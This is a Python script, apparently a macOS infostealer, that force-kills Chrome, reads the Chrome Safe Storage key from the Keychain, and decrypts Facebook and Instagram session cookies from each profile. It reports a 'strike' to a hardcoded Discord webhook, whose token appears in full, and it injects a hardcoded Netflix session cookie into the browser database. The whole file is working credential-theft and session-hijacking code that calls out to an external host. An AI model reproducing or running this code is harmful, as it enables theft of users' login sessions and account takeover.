import os
import sqlite3
import json
import keyring
import shutil
import requests
import subprocess
import time
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

# --- SURGICAL CONFIGURATION ---
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"

# On définit la racine de Chrome
BASE_CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome")
TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db")

def kill_chrome():
    """Ferme Chrome pour libérer les verrous SQLite."""
    print("[*] Locking out Google Chrome processes...")
    subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
    time.sleep(2)

def get_encryption_key():
    """Récupère la clé via le Keychain macOS."""
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password: return None
    return PBKDF2(password, b'saltysalt', 16, count=1003)

def decrypt_value(enc_value, key):
    """Déchiffre les blobs AES-128-CBC."""
    try:
        iv = b' ' * 16
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc_value[3:])
        padding_len = decrypted[-1]
        return decrypted[:-padding_len].decode('utf-8')
    except: return None

def execute_strike():
    print(f"[*] Command Center Active. Session: {os.getlogin()}")
    
    # Liste des profils détectés sur ton screenshot
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
    
    for profile in profiles:
        # ON CONSTRUIT LE CHEMIN VERS LE FICHIER COOKIES, PAS LE DOSSIER
        current_chrome_db = os.path.join(BASE_CHROME_PATH, profile, "Cookies")
        
        if not os.path.exists(current_chrome_db):
            continue
            
        print(f"[*] Scanning Node: {profile}...")
        
        # Bypass Database Lock via Shadow Copy
        shutil.copyfile(current_chrome_db, TEMP_DB)
        conn = sqlite3.connect(TEMP_DB)
        cursor = conn.cursor()
        
        try:
            key = get_encryption_key()
            if not key:
                print(f"[!] Keychain Handshake Failed for {profile}")
                continue

            # 1. Extraction Meta
            query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%'"
            cursor.execute(query)
            exfiltration_data = []
            for host, name, enc_val in cursor.fetchall():
                decrypted = decrypt_value(enc_val, key)
                if decrypted:
                    exfiltration_data.append(f"{host} | {name} | {decrypted}")

            if exfiltration_data:
                print(f"[+] Found {len(exfiltration_data)} nodes in {profile}. Transmitting...")
                payload = {
                    "content": f"**STRIKE SUCCESS: {profile}**\nUser: {os.getlogin()}",
                    "embeds": [{"title": "Meta Session Audit", "description": "Extraction terminée. Mask on.", "color": 3447003}]
                }
                requests.post(DISCORD_WEBHOOK, json=payload)

            # 2. Injection Netflix (Schéma 2026 complet)
            if NETFLIX_COOKIE_VAL:
                print(f"[*] Injecting Persistence in {profile}...")
                now_ts = int((time.time() + 11644473600) * 1000000)
                expiry = 13350000000000000 
                
                # Ajout de encrypted_value (b'') pour satisfaire la contrainte NOT NULL
                sql = """
                    INSERT OR REPLACE INTO cookies 
                    (creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """
                params = (now_ts, '.netflix.com', '', 'NetflixId', NETFLIX_COOKIE_VAL, b'', '/', expiry, 1, 1, now_ts, 1, 1)
                
                cursor.execute(sql, params)
                conn.commit()

        except Exception as e:
            print(f"[!] Critical Error on {profile}: {e}")
        finally:
            conn.close()
            # On ferme Chrome avant de synchroniser le fichier
            kill_chrome()
            try:
                shutil.copyfile(TEMP_DB, current_chrome_db)
                print(f"[+++] Node {profile} Synchronized.")
            except Exception as e:
                print(f"[!] Sync Error on {profile}: {e}")

    # Nettoyage final
    if os.path.exists(TEMP_DB):
        os.remove(TEMP_DB)

if __name__ == "__main__":
    execute_strike()
